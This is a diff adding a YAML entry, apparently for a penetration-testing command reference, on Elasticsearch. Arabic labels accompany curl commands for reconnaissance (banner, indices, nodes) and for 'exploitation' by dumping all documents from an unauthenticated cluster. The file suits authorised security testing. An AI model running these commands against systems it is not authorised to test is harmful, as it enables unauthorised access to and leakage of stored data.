@@ -1,0 +1,28 @@
+service: elasticsearch
+port: 9200
+arabic_name: "Elasticsearch (محرك بحث)"
+description: "محرك بحث - كثيراً ما يكون مكشوفاً بدون مصادقة"
+commands:
+  enum:
+    arabic: "استطلاع"
+    items:
+      - cmd: "curl http://{target}:9200/"
+        desc: "قراءة البانر الأساسي"
+        output: JSON with version, cluster_name, tagline
+        when: "أول أمر - سريع جداً"
+      - cmd: "curl http://{target}:9200/_cat/indices?v"
+        desc: "قائمة كل الفهارس (indices)"
+        output: "قائمة قواعد بيانات ES"
+        when: "إذا كان مفتوحاً"
+      - cmd: "curl http://{target}:9200/_cat/nodes?v"
+        desc: "قائمة العقد (nodes)"
+        output: "IPs و roles"
+        when: "لاكتشاف الكلاستر"
+  vulnerabilities:
+    arabic: "استغلال"
+    items:
+      - cmd: "curl -X GET http://{target}:9200/_search?pretty"
+        desc: "قراءة كل البيانات"
+        output: "كل المستندات في الـ cluster"
+        when: "لاختبار تسريب البيانات"
+        warning: "قد يكون هناك كم هائل من البيانات"
